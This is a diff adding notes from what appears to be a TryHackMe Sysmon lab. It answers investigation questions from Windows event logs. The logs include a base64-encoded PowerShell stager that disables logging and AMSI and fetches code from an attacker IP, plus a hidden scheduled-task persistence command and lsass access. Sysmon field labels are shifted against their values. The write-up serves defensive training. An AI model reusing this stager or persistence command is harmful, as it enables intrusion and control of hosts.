@@ -1084,3 +1084,546 @@ Message      : Network connection detected:
                Protocol: true
                Initiated: false
                SourceIsIpv6: 172.168.103.167
+               SourceIp: DESKTOP-O153T4R.SSG-350M
+               SourceHostname: 52983
+               SourcePort: 0
+               SourcePortName: false
+               DestinationIsIpv6: 172.168.103.188
+               DestinationIp: ACA867BC.ipt.aol.com
+               DestinationHostname: 80
+               DestinationPort: 0
+               DestinationPortName: %18
+
+TimeCreated  : 2/5/2018 7:08:50 AM
+ProviderName : Microsoft-Windows-Sysmon
+Id           : 3
+Message      : Network connection detected:
+               RuleName: 2018-02-05 07:08:48.634
+               UtcTime: {b231f4ab-f2e9-5a77-0000-0010cb670802}
+               ProcessGuid: 11020
+               ProcessId: 0
+               Image: DESKTOP-O153T4R\q
+               User: tcp
+               Protocol: true
+               Initiated: false
+               SourceIsIpv6: 172.168.103.167
+               SourceIp: DESKTOP-O153T4R.SSG-350M
+               SourceHostname: 52982
+               SourcePort: 0
+               SourcePortName: false
+               DestinationIsIpv6: 172.168.103.188
+               DestinationIp: ACA867BC.ipt.aol.com
+               DestinationHostname: 80
+               DestinationPort: 0
+               DestinationPortName: %18
+
+TimeCreated  : 2/5/2018 7:08:45 AM
+ProviderName : Microsoft-Windows-Sysmon
+Id           : 3
+Message      : Network connection detected:
+               RuleName: 2018-02-05 07:08:43.588
+               UtcTime: {b231f4ab-f2e9-5a77-0000-0010cb670802}
+               ProcessGuid: 11020
+               ProcessId: 0
+               Image: DESKTOP-O153T4R\q
+               User: tcp
+               Protocol: true
+               Initiated: false
+               SourceIsIpv6: 172.168.103.167
+               SourceIp: DESKTOP-O153T4R.SSG-350M
+               SourceHostname: 52981
+               SourcePort: 0
+               SourcePortName: false
+               DestinationIsIpv6: 172.168.103.188
+               DestinationIp: ACA867BC.ipt.aol.com
+               DestinationHostname: 80
+               DestinationPort: 0
+               DestinationPortName: %18
+
+TimeCreated  : 2/5/2018 7:08:40 AM
+ProviderName : Microsoft-Windows-Sysmon
+Id           : 3
+Message      : Network connection detected:
+               RuleName: 2018-02-05 07:08:38.572
+               UtcTime: {b231f4ab-f2e9-5a77-0000-0010cb670802}
+               ProcessGuid: 11020
+               ProcessId: 0
+               Image: DESKTOP-O153T4R\q
+               User: tcp
+               Protocol: true
+               Initiated: false
+               SourceIsIpv6: 172.168.103.167
+               SourceIp: DESKTOP-O153T4R.SSG-350M
+               SourceHostname: 52980
+               SourcePort: 0
+               SourcePortName: false
+               DestinationIsIpv6: 172.168.103.188
+               DestinationIp: ACA867BC.ipt.aol.com
+               DestinationHostname: 80
+               DestinationPort: 0
+               DestinationPortName: %18
+```
+What is the IP of the adversary in Investigation 3.2?
+*172.168.103.188*
+```text
+PS C:\Users\THM-Analyst> Get-WinEvent -Path C:\Users\THM-Analyst\Desktop\Scenarios\Investigations\Investigation-3.2.evtx -FilterXPath '*/System/EventID=1 and */EventData/Data[@Name="Image"]="C:\Windows\System32\cmd.exe"' | fl
+
+TimeCreated  : 2/5/2018 7:08:53 AM
+ProviderName : Microsoft-Windows-Sysmon
+Id           : 1
+Message      : Process Create:
+               RuleName: 2018-02-05 07:08:53.715
+               UtcTime: {b231f4ab-0305-5a78-0000-0010c8256402}
+               ProcessGuid: 4804
+               ProcessId: 0
+               Image: 10.0.16299.15 (WinBuild.160101.0800)
+               FileVersion: Windows Command Processor
+               Description: Microsoft® Windows® Operating System
+               Product: Microsoft Corporation
+               Company: "C:\WINDOWS\system32\cmd.exe" /C "echo SQBmACgAJABQAFMAVgBFAFIAUwBpAG8ATgBUAEEAQgBMAEUALgBQAFMA
+               VgBFAFIAcwBpAG8AbgAuAE0AYQBqAE8AUgAgAC0ARwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBlAEYAXQAuAEEAUwBzAEUAbQBCAEwA
+               WQAuAEcAZQB0AFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4A
+               LgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAdABGAEkAZQBgAEwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkA
+               UwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBmACgAJABHAFAA
+               RgApAHsAJABHAFAAQwA9ACQARwBQAEYALgBHAEUAdABWAEEAbABVAGUAKAAkAE4AVQBMAEwAKQA7AEkARgAoACQARwBQAEMAWwAnAFMA
+               YwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsA
+               JwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcA
+               ZwBpAG4AZwAnAF0APQAwADsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsA
+               JwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAA
+               fQAkAHYAYQBsAD0AWwBDAE8AbABMAEUAYwBUAGkAbwBuAFMALgBHAEUAbgBFAHIAaQBjAC4ARABpAEMAdABpAG8AbgBBAHIAWQBbAFMA
+               VABSAEkAbgBnACwAUwB5AHMAdABlAG0ALgBPAEIAagBFAEMAVABdAF0AOgA6AG4AZQBXACgAKQA7ACQAdgBhAEwALgBBAEQAZAAoACcA
+               RQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAdgBBAGwALgBBAGQA
+               ZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwA
+               MAApADsAJABHAFAAQwBbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8A
+               bABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIA
+               aQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJAB2AGEATAB9AEUAbABzAEUAewBbAFMAQwByAEkAUABUAEIA
+               bABvAEMAawBdAC4AIgBHAEUAVABGAGkAZQBgAGwAZAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAA
+               dQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAHQAVgBhAEwAVQBlACgAJABOAFUAbABMACwAKABOAEUAVwAtAE8AQgBqAEUA
+               QwBUACAAQwBPAEwAbABFAGMAVABJAG8ATgBzAC4ARwBFAE4AZQBSAEkAYwAuAEgAYQBTAEgAUwBlAHQAWwBTAHQAUgBJAG4AZwBdACkA
+               KQB9AFsAUgBFAGYAXQAuAEEAcwBTAGUAbQBiAEwAWQAuAEcAZQBUAFQAWQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUA
+               bQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAfAA/AHsAJABfAH0AfAAlAHsAJABfAC4A
+               RwBlAHQARgBJAEUATABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQA
+               YQB0AGkAYwAnACkALgBTAEUAdABWAEEAbAB1AEUAKAAkAG4AVQBsAEwALAAkAHQAcgB1AEUAKQB9ADsAfQA7AFsAUwBZAHMAdABFAG0A
+               LgBOAEUAVAAuAFMAZQBSAHYASQBDAEUAUABPAEkAbgBUAE0AQQBOAEEARwBlAFIAXQA6ADoARQBYAFAAZQBjAFQAMQAwADAAQwBvAG4A
+               dABpAE4AVQBlAD0AMAA7ACQAVwBjAD0ATgBFAHcALQBPAGIASgBlAEMAVAAgAFMAWQBzAHQAZQBtAC4ATgBlAFQALgBXAEUAQgBDAGwA
+               SQBlAG4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcA
+               TwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcA
+               OwAkAHcAYwAuAEgAZQBhAEQARQByAFMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAQwAuAFAA
+               UgBPAHgAeQA9AFsAUwB5AFMAdABFAG0ALgBOAEUAdAAuAFcAZQBCAFIAZQBxAHUARQBzAFQAXQA6ADoARABFAEYAYQB1AEwAdABXAEUA
+               QgBQAHIAbwB4AHkAOwAkAFcAYwAuAFAAUgBvAHgAeQAuAEMAUgBFAEQARQBOAHQASQBhAGwAUwAgAD0AIABbAFMAeQBTAHQARQBNAC4A
+               TgBFAFQALgBDAFIARQBkAGUATgB0AEkAQQBMAEMAYQBjAEgAZQBdADoAOgBEAEUARgBBAHUATAB0AE4AZQBUAFcATwByAGsAQwBSAEUA
+               RABFAG4AdABJAGEAbABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAHcAYwAuAFAAcgBvAHgAeQA7ACQASwA9AFsA
+               UwB5AFMAVABFAG0ALgBUAGUAWABUAC4ARQBuAGMAbwBEAEkAbgBHAF0AOgA6AEEAUwBDAEkASQAuAEcARQB0AEIAWQBUAGUAUwAoACcA
+               NQA0ADEANgBkADcAYwBkADYAZQBmADEAOQA1AGEAMABmADcANgAyADIAYQA5AGMANQA2AGIANQA1AGUAOAA0ACcAKQA7ACQAUgA9AHsA
+               JABEACwAJABLAD0AJABBAFIAZwBzADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQA
+               UwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAFUAbgB0AF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoA
+               XQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0A
+               KAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMA
+               WwAkAEkAXQA7ACQAXwAtAGIAWABPAHIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQA
+               cwBlAHIAPQAnAGgAdAB0AHAAOgAvAC8AMQA3ADIALgAxADYAOAAuADEAMAAzAC4AMQA4ADgAOgA4ADAAJwA7ACQAdAA9ACcALwBsAG8A
+               ZwBpAG4ALwBwAHIAbwBjAGUAcwBzAC4AcABoAHAAJwA7ACQAdwBjAC4ASABFAEEARABlAHIAUwAuAEEARABkACgAIgBDAG8AbwBrAGkA
+               ZQAiACwAIgBzAGUAcwBzAGkAbwBuAD0AegBnADcALwBJAGgATAB5AEYAQQBHAHgAUgB1AGkAdwBRADUAMgB3AHcAdAAzAG4ATgBxAHMA
+               PQAiACkAOwAkAEQAYQBUAGEAPQAkAFcAQwAuAEQATwB3AE4AbABvAEEARABEAEEAdABBACgAJABzAEUAcgArACQAdAApADsAJABpAHYA
+               PQAkAEQAYQB0AEEAWwAwAC4ALgAzAF0AOwAkAGQAYQB0AGEAPQAkAGQAQQB0AEEAWwA0AC4ALgAkAGQAQQBUAEEALgBsAGUAbgBHAHQA
+               SABdADsALQBqAE8ASQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAQQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkA
+               RQBYAA== > c:\users\q\AppData:blah.txt"
+               OriginalFileName: C:\Users\q\
+               CommandLine: DESKTOP-O153T4R\q
+               CurrentDirectory: {b231f4ab-a303-5a66-0000-002087720500}
+               User: 0x57287
+               LogonGuid: 1
+               LogonId: 0x0
+               TerminalSessionId: 0
+               IntegrityLevel: {b231f4ab-f2e9-5a77-0000-0010cb670802}
+               Hashes: 11020
+               ParentProcessGuid: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+               ParentProcessId: 0
+               ParentImage: %21
+               ParentCommandLine: %22
+```
+What is the full path of the payload location in Investigation 3.2?
+`c:\users\q\AppData:blah.txt`
+```text
+PS C:\Users\THM-Analyst> Get-WinEvent -Path C:\Users\THM-Analyst\Desktop\Scenarios\Investigations\Investigation-3.2.evtx -FilterXPath '*/System/EventID=1 and */EventData/Data[@Name="Image"]="C:\Windows\System32\schtasks.exe"' | fl
+
+TimeCreated  : 2/5/2018 7:08:53 AM
+ProviderName : Microsoft-Windows-Sysmon
+Id           : 1
+Message      : Process Create:
+               RuleName: 2018-02-05 07:08:53.750
+               UtcTime: {b231f4ab-0305-5a78-0000-00101b276402}
+               ProcessGuid: 8992
+               ProcessId: 0
+               Image: 10.0.16299.15 (WinBuild.160101.0800)
+               FileVersion: Task Scheduler Configuration Tool
+               Description: Microsoft® Windows® Operating System
+               Product: Microsoft Corporation
+               Company: "C:\WINDOWS\system32\schtasks.exe" /Create /F /SC DAILY /ST 09:00 /TN Updater /TR
+               "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX
+               ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String($(cmd /c ''more <
+               c:\users\q\AppData:blah.txt'''))))\""
+               OriginalFileName: C:\Users\q\
+               CommandLine: DESKTOP-O153T4R\q
+               CurrentDirectory: {b231f4ab-a303-5a66-0000-002087720500}
+               User: 0x57287
+               LogonGuid: 1
+               LogonId: 0x0
+               TerminalSessionId: 0
+               IntegrityLevel: {b231f4ab-f2e9-5a77-0000-0010cb670802}
+               Hashes: 11020
+               ParentProcessGuid: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+               ParentProcessId: 0
+               ParentImage: %21
+               ParentCommandLine: %22
+```
+What was the full command used to create the scheduled task in Investigation 3.2?
+`"C:\WINDOWS\system32\schtasks.exe" /Create /F /SC DAILY /ST 09:00 /TN Updater /TR               "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX               ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String($(cmd /c ''more <c:\users\q\AppData:blah.txt'''))))\""`
+```text
+PS C:\Users\THM-Analyst> Get-WinEvent -Path C:\Users\THM-Analyst\Desktop\Scenarios\Investigations\Investigation-3.2.evtx -FilterXPath '*/System/EventID=10 and */EventData/Data[@Name="SourceImage"]="C:\Windows\System32\lsass.exe"' | fl
+
+TimeCreated  : 2/5/2018 7:08:53 AM
+ProviderName : Microsoft-Windows-Sysmon
+Id           : 10
+Message      : Process accessed:
+               RuleName: 2018-02-05 07:08:53.766
+               UtcTime: {b231f4ab-a2ef-5a66-0000-0010ec930000}
+               SourceProcessGUID: 756
+               SourceProcessId: 6404
+               SourceThreadId: 0
+               SourceImage: {b231f4ab-0305-5a78-0000-00101b276402}
+               TargetProcessGUID: 8992
+               TargetProcessId: 0
+               TargetImage: 0x1478
+               GrantedAccess: 0xC
+               CallTrace: %11
+
+TimeCreated  : 2/5/2018 7:08:53 AM
+ProviderName : Microsoft-Windows-Sysmon
+Id           : 10
+Message      : Process accessed:
+               RuleName: 2018-02-05 07:08:53.766
+               UtcTime: {b231f4ab-a2ef-5a66-0000-0010ec930000}
+               SourceProcessGUID: 756
+               SourceProcessId: 6404
+               SourceThreadId: 0
+               SourceImage: {b231f4ab-0305-5a78-0000-00101b276402}
+               TargetProcessGUID: 8992
+               TargetProcessId: 0
+               TargetImage: 0x1000
+               GrantedAccess: 0xC
+               CallTrace: %11
+```
+What process was accessed by schtasks.exe that would be considered suspicious behavior in Investigation 3.2?
+*lsass.exe*
+```text
+PS C:\Users\THM-Analyst> Get-WinEvent -Path C:\Users\THM-Analyst\Desktop\Scenarios\Investigations\Investigation-4.evtx -FilterXPath '*/System/EventID=3' | fl
+
+TimeCreated  : 2/19/2018 5:14:25 AM
+ProviderName : Microsoft-Windows-Sysmon
+Id           : 3
+Message      : Network connection detected:
+               RuleName: 2018-02-14 09:51:58.725
+               UtcTime: {b231f4ab-02e9-5a84-0000-0010586c0200}
+               ProcessGuid: 4152
+               ProcessId: 0
+               Image: NT AUTHORITY\LOCAL SERVICE
+               User: udp
+               Protocol: false
+               Initiated: false
+               SourceIsIpv6: 239.255.255.250
+               SourceIp:
+               SourceHostname: 1900
+               SourcePort: 0
+               SourcePortName: false
+               DestinationIsIpv6: 127.0.0.1
+               DestinationIp: DESKTOP-O153T4R
+               DestinationHostname: 51228
+               DestinationPort: 0
+               DestinationPortName: %18
+
+TimeCreated  : 2/19/2018 5:14:25 AM
+ProviderName : Microsoft-Windows-Sysmon
+Id           : 3
+Message      : Network connection detected:
+               RuleName: 2018-02-14 09:51:58.724
+               UtcTime: {b231f4ab-02e9-5a84-0000-0010586c0200}
+               ProcessGuid: 4152
+               ProcessId: 0
+               Image: NT AUTHORITY\LOCAL SERVICE
+               User: udp
+               Protocol: true
+               Initiated: false
+               SourceIsIpv6: 127.0.0.1
+               SourceIp: DESKTOP-O153T4R
+               SourceHostname: 51228
+               SourcePort: 0
+               SourcePortName: false
+               DestinationIsIpv6: 239.255.255.250
+               DestinationIp:
+               DestinationHostname: 1900
+               DestinationPort: 0
+               DestinationPortName: %18
+
+TimeCreated  : 2/19/2018 5:14:25 AM
+ProviderName : Microsoft-Windows-Sysmon
+Id           : 3
+Message      : Network connection detected:
+               RuleName: 2018-02-14 09:51:58.697
+               UtcTime: {b231f4ab-02e7-5a84-0000-0010b2590100}
+               ProcessGuid: 1776
+               ProcessId: 0
+               Image: NT AUTHORITY\LOCAL SERVICE
+               User: udp
+               Protocol: true
+               Initiated: false
+               SourceIsIpv6: 172.16.199.179
+               SourceIp: DESKTOP-O153T4R.localdomain
+               SourceHostname: 68
+               SourcePort: 0
+               SourcePortName: false
+               DestinationIsIpv6: 172.16.199.254
+               DestinationIp:
+               DestinationHostname: 67
+               DestinationPort: 0
+               DestinationPortName: %18
+
+TimeCreated  : 2/14/2018 9:51:56 AM
+ProviderName : Microsoft-Windows-Sysmon
+Id           : 3
+Message      : Network connection detected:
+               RuleName: 2018-02-14 09:51:55.108
+               UtcTime: {b231f4ab-03e3-5a84-0000-001082172a00}
+               ProcessGuid: 7412
+               ProcessId: 0
+               Image: NT AUTHORITY\SYSTEM
+               User: tcp
+               Protocol: true
+               Initiated: false
+               SourceIsIpv6: 172.16.199.179
+               SourceIp: DESKTOP-O153T4R.localdomain
+               SourceHostname: 49867
+               SourcePort: 0
+               SourcePortName: false
+               DestinationIsIpv6: 172.30.1.253
+               DestinationIp: empirec2
+               DestinationHostname: 80
+               DestinationPort: 0
+               DestinationPortName: %18
+
+TimeCreated  : 2/14/2018 9:51:52 AM
+ProviderName : Microsoft-Windows-Sysmon
+Id           : 3
+Message      : Network connection detected:
+               RuleName: 2018-02-14 09:51:50.091
+               UtcTime: {b231f4ab-03e3-5a84-0000-001082172a00}
+               ProcessGuid: 7412
+               ProcessId: 0
+               Image: NT AUTHORITY\SYSTEM
+               User: tcp
+               Protocol: true
+               Initiated: false
+               SourceIsIpv6: 172.16.199.179
+               SourceIp: DESKTOP-O153T4R.localdomain
+               SourceHostname: 49866
+               SourcePort: 0
+               SourcePortName: false
+               DestinationIsIpv6: 172.30.1.253
+               DestinationIp: empirec2
+               DestinationHostname: 80
+               DestinationPort: 0
+               DestinationPortName: %18
+
+TimeCreated  : 2/14/2018 9:51:47 AM
+ProviderName : Microsoft-Windows-Sysmon
+Id           : 3
+Message      : Network connection detected:
+               RuleName: 2018-02-14 09:51:45.060
+               UtcTime: {b231f4ab-03e3-5a84-0000-001082172a00}
+               ProcessGuid: 7412
+               ProcessId: 0
+               Image: NT AUTHORITY\SYSTEM
+               User: tcp
+               Protocol: true
+               Initiated: false
+               SourceIsIpv6: 172.16.199.179
+               SourceIp: DESKTOP-O153T4R.localdomain
+               SourceHostname: 49865
+               SourcePort: 0
+               SourcePortName: false
+               DestinationIsIpv6: 172.30.1.253
+               DestinationIp: empirec2
+               DestinationHostname: 80
+               DestinationPort: 0
+               DestinationPortName: %18
+
+TimeCreated  : 2/14/2018 9:51:41 AM
+ProviderName : Microsoft-Windows-Sysmon
+Id           : 3
+Message      : Network connection detected:
+               RuleName: 2018-02-14 09:51:40.044
+               UtcTime: {b231f4ab-03e3-5a84-0000-001082172a00}
+               ProcessGuid: 7412
+               ProcessId: 0
+               Image: NT AUTHORITY\SYSTEM
+               User: tcp
+               Protocol: true
+               Initiated: false
+               SourceIsIpv6: 172.16.199.179
+               SourceIp: DESKTOP-O153T4R.localdomain
+               SourceHostname: 49864
+               SourcePort: 0
+               SourcePortName: false
+               DestinationIsIpv6: 172.30.1.253
+               DestinationIp: empirec2
+               DestinationHostname: 80
+               DestinationPort: 0
+               DestinationPortName: %18
+
+TimeCreated  : 2/14/2018 9:51:36 AM
+ProviderName : Microsoft-Windows-Sysmon
+Id           : 3
+Message      : Network connection detected:
+               RuleName: 2018-02-14 09:51:35.014
+               UtcTime: {b231f4ab-03e3-5a84-0000-001082172a00}
+               ProcessGuid: 7412
+               ProcessId: 0
+               Image: NT AUTHORITY\SYSTEM
+               User: tcp
+               Protocol: true
+               Initiated: false
+               SourceIsIpv6: 172.16.199.179
+               SourceIp: DESKTOP-O153T4R.localdomain
+               SourceHostname: 49863
+               SourcePort: 0
+               SourcePortName: false
+               DestinationIsIpv6: 172.30.1.253
+               DestinationIp: empirec2
+               DestinationHostname: 80
+               DestinationPort: 0
+               DestinationPortName: %18
+
+TimeCreated  : 2/14/2018 9:51:32 AM
+ProviderName : Microsoft-Windows-Sysmon
+Id           : 3
+Message      : Network connection detected:
+               RuleName: 2018-02-14 09:51:29.997
+               UtcTime: {b231f4ab-03e3-5a84-0000-001082172a00}
+               ProcessGuid: 7412
+               ProcessId: 0
+               Image: NT AUTHORITY\SYSTEM
+               User: tcp
+               Protocol: true
+               Initiated: false
+               SourceIsIpv6: 172.16.199.179
+               SourceIp: DESKTOP-O153T4R.localdomain
+               SourceHostname: 49862
+               SourcePort: 0
+               SourcePortName: false
+               DestinationIsIpv6: 172.30.1.253
+               DestinationIp: empirec2
+               DestinationHostname: 80
+               DestinationPort: 0
+               DestinationPortName: %18
+
+TimeCreated  : 2/14/2018 9:51:26 AM
+ProviderName : Microsoft-Windows-Sysmon
+Id           : 3
+Message      : Network connection detected:
+               RuleName: 2018-02-14 09:51:24.967
+               UtcTime: {b231f4ab-03e3-5a84-0000-001082172a00}
+               ProcessGuid: 7412
+               ProcessId: 0
+               Image: NT AUTHORITY\SYSTEM
+               User: tcp
+               Protocol: true
+               Initiated: false
+               SourceIsIpv6: 172.16.199.179
+               SourceIp: DESKTOP-O153T4R.localdomain
+               SourceHostname: 49861
+               SourcePort: 0
+               SourcePortName: false
+               DestinationIsIpv6: 172.30.1.253
+               DestinationIp: empirec2
+               DestinationHostname: 80
+               DestinationPort: 0
+               DestinationPortName: %18
+
+TimeCreated  : 2/14/2018 9:51:21 AM
+ProviderName : Microsoft-Windows-Sysmon
+Id           : 3
+Message      : Network connection detected:
+               RuleName: 2018-02-14 09:51:20.429
+               UtcTime: {b231f4ab-02e9-5a84-0000-0010586c0200}
+               ProcessGuid: 4152
+               ProcessId: 0
+               Image: NT AUTHORITY\LOCAL SERVICE
+               User: udp
+               Protocol: false
+               Initiated: false
+               SourceIsIpv6: 239.255.255.250
+               SourceIp:
+               SourceHostname: 1900
+               SourcePort: 0
+               SourcePortName: false
+               DestinationIsIpv6: 172.16.199.1
+               DestinationIp:
+               DestinationHostname: 57637
+               DestinationPort: 0
+               DestinationPortName: %18
+
+TimeCreated  : 2/14/2018 9:51:21 AM
+ProviderName : Microsoft-Windows-Sysmon
+Id           : 3
+Message      : Network connection detected:
+               RuleName: 2018-02-14 09:51:20.429
+               UtcTime: {b231f4ab-02e9-5a84-0000-0010586c0200}
+               ProcessGuid: 4152
+               ProcessId: 0
+               Image: NT AUTHORITY\LOCAL SERVICE
+               User: udp
+               Protocol: false
+               Initiated: false
+               SourceIsIpv6: 239.255.255.250
+               SourceIp:
+               SourceHostname: 1900
+               SourcePort: 0
+               SourcePortName: false
+               DestinationIsIpv6: 172.16.199.1
+               DestinationIp:
+               DestinationHostname: 57642
+               DestinationPort: 0
+               DestinationPortName: %18
+
+TimeCreated  : 2/14/2018 9:51:21 AM
+ProviderName : Microsoft-Windows-Sysmon
+Id           : 3
+Message      : Network connection detected:
+               RuleName: 2018-02-14 09:51:19.919
+               UtcTime: {b231f4ab-03e3-5a84-0000-001082172a00}
+               ProcessGuid: 7412
+               ProcessId: 0
+               Image: NT AUTHORITY\SYSTEM
+               User: tcp
+               Protocol: true
+               Initiated: false
+               SourceIsIpv6: 172.16.199.179
+               SourceIp: DESKTOP-O153T4R.localdomain
+               SourceHostname: 49860
+               SourcePort: 0
+               SourcePortName: false
+               DestinationIsIpv6: 172.30.1.253
+               DestinationIp: empirec2
+               DestinationHostname: 80
+               DestinationPort: 0
+               DestinationPortName: %18
+```
+What is the IP of the adversary in Investigation 4?
+*172.30.1.253*
+What port is the adversary operating on in Investigation 4?
+*80*
+What C2 is the adversary utilizing in Investigation 4?
+*empire*
+
+## Notes / Lessons Learned
+[[Windows Event Logs]]
+
